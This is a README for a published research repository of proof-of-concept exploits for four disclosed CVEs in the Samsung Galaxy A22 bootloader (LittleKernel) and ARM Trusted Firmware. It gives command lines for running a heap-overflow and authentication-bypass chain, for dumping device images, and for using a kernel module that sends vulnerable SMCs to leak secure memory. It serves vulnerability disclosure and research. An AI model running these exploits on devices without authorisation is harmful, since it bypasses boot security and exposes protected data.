# Samsung Mediatek PoCs

This repository contains the exploits of 4 vulnerabilities
- SVE-2023-2079/CVE-2024-20832 and SVE-2024-0234/CVE-2024-20865 impacting LittleKernel
- and SVE-2023-2215/CVE-2024-20820 and CVE-2024-20021 impacting the ARM Trusted Firmware (or ATF).

The PoCs have been designed to work on a Samsung Galaxy A22 (SM-A225F/DSN), with the build number `TP1A.220624.014.A225FXXU6DWE3`.

The vulnerabilities are described in detail in our talk ["Attacking the Samsung Galaxy A* Boot Chain" we presented at OffensiveCon 2024](https://www.youtube.com/watch?v=WJ7wkJn7l7w). A [whitepaper](https://www.sstic.org/media/SSTIC2024/SSTIC-actes/when_vendor1_meets_vendor2_the_story_of_a_small_bu/SSTIC2024-Article-when_vendor1_meets_vendor2_the_story_of_a_small_bug_chain-rossi-bellom_neveu.pdf) is also available for a similar talk we gave at SSTIC 2024.

## Code Execution in LittleKernel

In `piece_montee_reloaded/`, are present the PoCs for Little Kernel vulnerabilities
- SVE-2023-2079/CVE-2024-20832: Heap overflow in bootloader, exploited with `heap_overflow.py`
- SVE-2024-0234/CVE-2024-20865: Authentication bypass in bootloader, exploited with `this_is_fine.py` and `odin_sig_bypass.py`

To launch the exploit

```bash	
$ python this_is_fine.py all . --pit pit.bin --gpt gpt.bin --boot boot.bin --up_param up_param.bin -H </path/to/heimdall>
```

### Prerequisites

This exploit uses [Heimdall](https://github.com/Benjamin-Dobell/Heimdall) to communicate with Odin.

The attack to work requires the following images from the device:
- `pit.bin`

> It can be retrieved with Heimdall.
> 
> ```bash
> $ heimdall download-pit --output pit.bin
> ```

- `gpt.bin`

> It can be retrieved from a rooted device with `dd`. Or with [MTKClient](https://github.com/bkerler/mtkclient).
> 
> ```bash
> $ python $MTKCLIENT_DIR/mtk r gpt gpt.bin --preloader <path/to/preloader>
> ```

- `boot.bin`

> Must be patched using [Magisk](https://github.com/topjohnwu/Magisk) to get root privileges.
> 
> The original image can be downloaded along with the stock firmware (https://samfw.com/firmware/SM-A225F). Or dumped with MTKClient.
> 
> ```bash
> $ python $MTKCLIENT_DIR/mtk r boot boot.img --preloader <path/to/preloader>
> ```

- `up_param.bin`

> Only the original image is required. Can be also retrieved along with the stock firmware or using MTKClient.
> 
> ```bash
> $ python $MTKCLIENT_DIR/mtk r up_param up_param.img --preloader <path/to/preloader>
> ```

### Restore the device

```bash
$ python $MTKCLIENT_DIR/mtk w boot,gpt boot.img,gpt.bin --preloader <path/to/preloader>
```

## Memory Leak in ARM Trusted

In `demo_atf` directory you will find the PoC for ATF
- SVE-2023-2215/CVE-2024-20820 Read out-of-bound in ATF
- CVE-2024-20021 Remap physical memory in ATF

We implemented a short C program `send_smc.c` to exploit these two vulnerabilities. It will simply send
the two vulnerable SMCs (`0x8200022a` for the read out-of-bound, and `0xc2000526` for the mmap) to ATF.
The command `mmap_data` will mmap a memory region (using a physical address and size) to the same virtual
address and `leak_data` will leak the content of a memory region using a virtual address.

**Note** that the system limits to 8 consecutive mmaps. An extra mmap or an attempt to leak an address not mmapped
will **surely crash** the device.

### Prerequisites

Only the Kernel can send SMCs. Which is why we implemented a dummy kernel module in charge of forwarding SMCs received from userland through IOCTLs.

### Build

```
$ aarch64-linux-gnu-gcc -static send_smc.c -o send_smc # Compile the binary
$ adb push send_smc /data/local/tmp # Push it on the device
$ adb push smc_forward.ko.fixed /data/local/tmp # Push the kernel module
```

### Usage

On the device

```
$ su
# cd /data/local/tmp
# insmod smc_forward.ko.fixed
# ./send_smc mmap_data 0x7c200000 0x600000
# ./send_smc leak_data 0x7c200000 0x600000 > /data/local/tmp/dump.bin
```

# Contributors

- Maxime Rossi Bellom
- Raphael Neveu
- Gabrielle Viala
- Damiano Melotti